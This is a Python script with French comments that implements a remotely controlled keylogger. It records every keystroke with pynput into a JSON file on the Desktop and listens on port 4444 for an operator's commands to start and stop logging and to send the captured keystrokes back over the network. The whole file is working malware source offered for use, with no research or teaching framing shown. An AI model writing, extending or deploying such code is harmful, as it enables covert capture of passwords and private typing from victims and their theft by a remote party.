import os
import json
import socket
import threading
from pynput import keyboard

KEYLOG_FILE = os.path.join(os.path.expanduser("~"), "Desktop", "keylogs.json")
keylog_data = []
keylog_active = False

def keylogger_start():
    """Demarre le keylogger et enregistre les frappes dans keylogs.json."""
    global keylog_active
    keylog_active = True
    keylog_data.clear()

    def on_press(key):
        if not keylog_active:
            return False
        try:
            key_data = {"key": key.char}
        except AttributeError:
            key_data = {"key": str(key)}

        keylog_data.append(key_data)

        with open(KEYLOG_FILE, "w") as f:
            json.dump(keylog_data, f)

    print(f"Keylogger enregistre les frappes dans : {KEYLOG_FILE}")
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    return listener

def send_keylogs_to_admin(sock):
    """Envoie le fichier keylogs.json a l'admin."""
    if not os.path.exists(KEYLOG_FILE):
        sock.sendall(b"ERROR: keylogs.json non trouve")
        return
    
    sock.sendall(b"START_FILE_TRANSFER")  
    
    with open(KEYLOG_FILE, "rb") as f:
        data = f.read()
        sock.sendall(data)  
    
    sock.sendall(b"END_FILE_TRANSFER")  
    print(f"Fichier envoye a l'admin.")

def handle_client(sock):
    """Gere les commandes recues de l'admin."""
    global keylog_active
    listener = None

    while True:
        try:
            data = sock.recv(1024).decode().strip()
            if not data:
                break

            print(f"Commande recue : {data}")

            if data == "start_keylogger":
                if not keylog_active:
                    listener = keylogger_start()
                    sock.sendall(b"Keylogger demarre.")
                else:
                    sock.sendall(b"Keylogger deja en cours.")

            elif data == "stop_keylogger":
                keylog_active = False
                if listener:
                    listener.stop()
                sock.sendall(b"Keylogger arrete.")

            elif data == "get_keylogs":
                send_keylogs_to_admin(sock)

            else:
                sock.sendall(b"Commande inconnue.")

        except Exception as e:
            print(f"Erreur: {e}")
            break

    sock.close()

def start_server(host="0.0.0.0", port=4444):
    """Demarre le serveur sur la machine cliente."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"Serveur en attente sur {host}:{port}...")

    while True:
        client_sock, addr = server.accept()
        print(f"Connexion etablie avec {addr}")
        threading.Thread(target=handle_client, args=(client_sock,)).start()

if __name__ == "__main__":
    start_server()